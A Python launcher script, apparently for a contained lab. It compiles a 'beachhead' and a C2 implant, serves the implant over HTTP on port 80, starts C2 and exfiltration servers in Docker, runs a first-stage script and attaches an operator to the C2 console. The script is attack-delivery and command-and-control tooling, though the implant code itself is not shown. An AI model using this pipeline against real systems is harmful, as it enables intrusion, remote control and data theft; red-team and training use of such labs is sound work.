import subprocess
import sys
import time
import shutil
import os

# CONFIGURATION
HTTP_SERVER_PORT = 80
PUB_KEY = "cert.pem"
PRIV_KEY = "key.pem"
FIRST_STAGE_SCRIPT = 'first_stage.py'
BEACHHEAD_DIR = 'beachhead'
IMPLANT_DIR = 'c2Implant'

# Need to copy both .pem files onto both docker containers, PUB_KEY to target
os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {PRIV_KEY} -out {PUB_KEY} -days 365 -nodes -subj \"/C=US/ST=State/L=City/O=Company/OU=IT/CN=example.com\"")

# Compile beachhead
print(f"Compiling {BEACHHEAD_DIR}...")
try:
    subprocess.run(['make'], cwd=BEACHHEAD_DIR, check=True)
    print(f"{BEACHHEAD_DIR} compiled successfully")
except subprocess.CalledProcessError as e:
    print(f"Error compiling {BEACHHEAD_DIR}: {e}")
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: 'make' command not found")
    sys.exit(1)

time.sleep(1)

# Compile implant
print(f"Compiling {IMPLANT_DIR}...")
try:
    subprocess.run(['make'], cwd=IMPLANT_DIR, check=True)
    print(f"{IMPLANT_DIR} compiled successfully")
except subprocess.CalledProcessError as e:
    print(f"Error compiling {IMPLANT_DIR}: {e}")
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: 'make' command not found")
    sys.exit(1)

time.sleep(1)

# move implant to main directory for hosting
implant_source = os.path.join(IMPLANT_DIR, 'implant')
implant_destination = os.path.join('.', 'implant')
try:
    shutil.copy(implant_source, implant_destination)
    print(f"Copied implant from {implant_source} to {implant_destination}")
except Exception as e:
    print(f"Error copying implant: {e}")
    sys.exit(1)

# Start the HTTP server
print(f"Starting HTTP server on port {HTTP_SERVER_PORT}...")
http_server = None
try:
    http_server = subprocess.Popen([sys.executable, '-m', 'http.server', str(HTTP_SERVER_PORT)])
    print(f"HTTP server started (PID: {http_server.pid})")
except Exception as e:
    print(f"Error starting HTTP server: {e}")
    sys.exit(1)

try:
    time.sleep(1)

    # Ensure c2_outputs.txt exists as a file before starting docker-compose
    output_file = 'c2_outputs.txt'
    if os.path.exists(output_file):
        if os.path.isdir(output_file):
            print(f"'{output_file}' exists as a directory, removing it.")
            shutil.rmtree(output_file)
    # Create the file
    open(output_file, 'a').close()

    # Start C2 and exfil servers using docker-compose
    print("\n--- Starting C2 and exfil servers with docker-compose ---")
    try:
        # Start services in detached mode
        subprocess.run(['docker-compose', 'up', '--build', '-d'], check=True)
        print("C2 and exfil servers are starting...")
        time.sleep(10) # Give some time for containers to be up and running

        # Check the status of the containers
        print("\n--- Checking container status ---")
        subprocess.run(['docker-compose', 'ps'])

        # Find the container ID for the c2-server
        result = subprocess.run(['docker-compose', 'ps', '-q', 'c2-server'], capture_output=True, text=True)
        c2_container_id = result.stdout.strip()

        if not c2_container_id:
            print("\nError: Could not find the c2-server container.")
            print("--- Displaying docker-compose logs for debugging ---")
            subprocess.run(['docker-compose', 'logs'])
            sys.exit(1) # Exit, which will trigger the outer finally block

        # Run first stage script
        print(f"Running {FIRST_STAGE_SCRIPT}...")
        try:
            first_stage = subprocess.run([sys.executable, FIRST_STAGE_SCRIPT], check=True)
            print(f"{FIRST_STAGE_SCRIPT} completed successfully")
        except subprocess.CalledProcessError as e:
            print(f"Error running {FIRST_STAGE_SCRIPT}: {e}")
            sys.exit(1)
        except FileNotFoundError:
            print(f"Error: Could not find '{FIRST_STAGE_SCRIPT}'")
            sys.exit(1)

        print("\n--- Waiting for implant to connect... ---")
        time.sleep(5) # Give implant time to connect

        print(f"\n--- Attaching to C2 server ({c2_container_id}) ---")
        print("You can now type commands below.")
        print("To detach from the container, press Ctrl+P, then Ctrl+Q.")
        
        # Attach to the c2-server container for interactive commands
        subprocess.run(['docker', 'attach', c2_container_id])

    except subprocess.CalledProcessError as e:
        print(f"Error with docker-compose: {e}")
    except FileNotFoundError:
        print("Error: 'docker-compose' or 'docker' command not found. Please ensure Docker is installed and in your PATH.")
    except KeyboardInterrupt:
        print("\nDetaching from C2 server...")
    finally:
        print("\nShutting down docker-compose services...")
        subprocess.run(['docker-compose', 'down'])

finally:
    if http_server:
        print("Shutting down HTTP server...")
        http_server.terminate()
    print("Clean exit.")